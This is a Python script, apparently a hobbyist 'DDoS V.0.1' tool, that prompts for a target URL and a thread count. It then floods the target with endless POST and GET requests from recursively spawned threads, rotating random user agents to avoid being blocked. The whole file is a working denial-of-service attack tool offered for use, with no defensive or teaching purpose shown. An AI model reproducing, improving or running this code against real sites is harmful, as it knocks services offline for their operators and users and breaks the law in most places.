# Last Update: 12-09-2021, Author: Lusmaysh
import sys,os
R = "\33[31;1m";G = "\33[32;1m";Y = "\33[33;1m";
try:
	from requests import *
	from threading import Thread
	from fake_useragent import UserAgent
except:
	sys.exit(f"{Y}[{R}!{Y}] {G}You Haven't Install The Package\n{Y}[{R}!{Y}] {G}Type: pip install -r .req.txt")

def main():
	os.system("cls" if os.name=="nt" else "clear")
	print(f"""{Y}■□■□■ {G}DDOS V.0.1 | By Lusmaysh {Y}■□■□■{G}\n
▓█████▄ ▓█████▄  ▒█████    ██████    {R}V.0.1{G}
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░
   ░       ░        ░ ░        ░
 ░       ░
""")
	try:
		url = input(f"root{R}@{G}ddos (Url) {Y}≽ {R}")
		get(url)
		print(f"{Y}[{R}✠{Y}] {G}OK")
	except exceptions.ConnectionError:
		sys.exit(f"{Y}[{R}✠{Y}] {R}Please Check Your Internet!")
	except:
		sys.exit(f"{Y}[{R}✠{Y}] {R}Url Not Exsist!")
	try:
		loop = int(input(f"{G}root{R}@{G}ddos (Threads) {Y}≽ {R}"))
		print(f"{Y}[{R}✠{Y}] {G}OK")
	except:
		sys.exit(f"{Y}[{R}✠{Y}] {R}Invalid Threads!")
	option = input(f"""
{Y}[{R}1{Y}] {G}Use One User-Agent Always
{Y}[{R}2{Y}] {G}Changing User-Agent For Each Cycle

{G}root{R}@{G}ddos (Option) {Y}≽ {R}""")
	if option == "1" or option == "2":
		print(f"{Y}[{R}✠{Y}] {G}OK")
	else:
		sys.exit(f"{Y}[{R}✠{Y}] {R}Invalid Option!")
	start = input(f"""
{Y}[{R}✠{Y}] {G}Yes (y)
{Y}[{R}✠{Y}] {G}No (n)

{G}root{R}@{G}ddos (Start DDoS) {Y}≽ {R}""")
	def ddos_mode1():
		try:
			ua = UserAgent().random
			while True:
				try:
					headers = {'User_Agent': ua}
					ddos = post(url=url, headers=headers)
					ddos2 = get(url=url, headers=headers)
					for x in range(loop):
						thread = Thread(target=ddos_mode1, daemon=True)
						thread.start()
						url_check_status = get(url=url, headers=headers)
						if url_check_status.status_code == 200:
							print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {url_check_status}")
						else:
							print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {url_check_status}")
				except:
					continue
		except exceptions.ConnectionError:
			sys.exit(f"{Y}[{R}✠{Y}] {R}Please Check Your Internet!")
	def ddos_mode2():
		try:
			while True:
				try:
					ua = UserAgent().random
					headers = {'User_Agent': ua}
					ddos = post(url=url, headers=headers)
					ddos2 = get(url=url, headers=headers)
					for x in range(loop):
						thread = Thread(target=ddos_mode1, daemon=True)
						thread.start()
						url_check_status = get(url=url, headers=headers)
						if url_check_status.status_code == 200:
							print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {url_check_status}")
						else:
							print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {url_check_status}")
				except:
					continue
		except exceptions.ConnectionError:
			sys.exit(f"{Y}[{R}✠{Y}] {R}Please Check Your Internet!")
	if start=="y" or start=="Y" or start=="yes" or start=="Yes" or start=="YES":
		if option == "1":
			ddos_mode1()
		elif option == "2":
			ddos_mode2()
	else:
		sys.exit(f"{Y}[{R}✠{Y}] {R}DDoS Attack Was Canceled!")

main()
